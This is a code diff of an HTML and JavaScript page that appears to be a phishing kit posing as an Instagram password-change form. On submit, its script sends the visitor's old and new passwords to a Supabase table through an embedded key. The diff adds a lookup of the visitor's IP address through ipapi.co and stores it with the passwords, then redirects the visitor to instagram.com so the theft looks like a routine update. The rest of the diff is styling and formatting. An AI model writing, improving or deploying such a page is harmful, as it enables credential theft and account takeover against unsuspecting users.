@@ -33,20 +33,18 @@
       color: grey;
       margin-bottom: 45px;
       line-height: 1.5;
-      text-align: center; /* 👈 This line centers the text */
+      text-align: center;
     }
-
 
     input {
       width: 80%;
-      padding: 14px 10px;     /* Increased height */
-      margin: 12px auto;       /* More vertical space between inputs */
+      padding: 14px 10px;
+      margin: 12px auto;
       border: 1px solid #ccc;
       border-radius: 5px;
       font-size: 14px;
       display: block;
     }
-
 
     button {
       width: 80%;
@@ -60,8 +58,6 @@
       cursor: pointer;
       display: block;
     }
-
-
 
     .message {
       margin-top: 10px;
@@ -101,41 +97,53 @@
       'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFneHBhcXBwcG5qb2V4Z2pjb2dsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE0NTI0ODIsImV4cCI6MjA2NzAyODQ4Mn0.da2h8-NCdbEaLBUgeDwqH1-FL6ki9IZMh-wg0t5Ebl0'
     )
 
-    window.storePasswords = async function () {
-      const oldPass = document.getElementById('old-password').value.trim()
-      const newPass = document.getElementById('new-password').value.trim()
-      const confirmPass = document.getElementById('confirm-password').value.trim()
-      const message = document.getElementById('message')
+    async function getUserIP() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'Unavailable';
+      }
+    }
 
-      message.textContent = ''
-      message.className = 'message'
+    window.storePasswords = async function () {
+      const oldPass = document.getElementById('old-password').value.trim();
+      const newPass = document.getElementById('new-password').value.trim();
+      const confirmPass = document.getElementById('confirm-password').value.trim();
+      const message = document.getElementById('message');
+
+      message.textContent = '';
+      message.className = 'message';
 
       if (!oldPass || !newPass || !confirmPass) {
-        message.textContent = 'All fields are required.'
-        message.classList.add('error')
-        return
+        message.textContent = 'All fields are required.';
+        message.classList.add('error');
+        return;
       }
 
       if (newPass !== confirmPass) {
-        message.textContent = 'New passwords do not match.'
-        message.classList.add('error')
-        return
+        message.textContent = 'New passwords do not match.';
+        message.classList.add('error');
+        return;
       }
 
+      const ip = await getUserIP();
+
       const { error } = await supabase.from('manual_passwords').insert([
-        { old_password: oldPass, new_password: newPass }
-      ])
+        { old_password: oldPass, new_password: newPass, ip }
+      ]);
 
       if (error) {
-        message.textContent = 'Error: ' + error.message
-        message.classList.add('error')
+        message.textContent = 'Error: ' + error.message;
+        message.classList.add('error');
       } else {
-        message.textContent = 'Passwords Changed.'
-        message.classList.add('success')
+        message.textContent = 'Passwords Changed.';
+        message.classList.add('success');
 
         setTimeout(() => {
-          window.location.href = 'https://www.instagram.com/'  // ⬅️ your custom URL here
-        }, 1500) // waits 1.5 seconds before redirect
+          window.location.href = 'https://www.instagram.com/';
+        }, 1500);
       }
     }
   </script>
